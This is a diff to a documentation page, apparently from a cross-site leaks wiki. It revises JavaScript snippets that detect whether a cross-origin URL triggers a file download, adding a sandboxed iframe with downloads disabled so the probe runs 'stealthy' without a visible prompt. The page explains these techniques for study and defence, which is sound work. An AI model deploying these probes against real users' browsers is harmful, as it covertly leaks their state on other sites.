@@ -39,13 +39,15 @@ When an endpoint sets the [`Content-Disposition: attachment`](https://developer.
 
 Another way to test for the [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) header is to check if a navigation occurred. If a page load causes a download, it does not trigger a navigation and the window stays within the same origin. [Run demo](https://xsinator.com/testing.html#Download%20Detection)
 
-The following snippet can be used to detect whether such a navigation has occurred and therefore detect a download attempt:
+In the snippet below , we've added a sandboxed iframe with downloads disabled to prevent a download modal from appearing. 
 
 ```javascript
 // Set the destination URL to test for the download attempt
 var url = 'https://example.org/';
 // Create an outer iframe to measure onload event
 var iframe = document.createElement('iframe');
+// Don't actually download the file to be stealthy
+iframe.sandbox = 'allow-scripts allow-same-origin allow-popups';
 document.body.appendChild(iframe);
 // Create an inner iframe to test for the download attempt
 iframe.srcdoc = `<iframe src="${url}" ></iframe>`;
@@ -71,13 +73,19 @@ This attack works regardless of any [Framing Protections]({{< ref "xfo" >}}), be
 
 ### Download Navigation (without iframes)
 
-A variation of the technique presented in the previous section can also be effectively tested using `window` objects:
+A variation of the technique presented in the previous section can also be effectively tested using `window` objects. In the snippet below, we've added a sandboxed iframe with disabled downloads to prevent a download modal from appearing.
 
 ```javascript
 // Set the destination URL
 var url = 'https://example.org';
+
+// Don't actually download the file to be stealthy
+var iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts allow-same-origin allow-popups';
+document.body.appendChild(iframe);
+
 // Get a window reference
-var win = window.open(url);
+var win = iframe.contentWindow.open(url);
 
 // Wait for the window to load.
 setTimeout(() => {
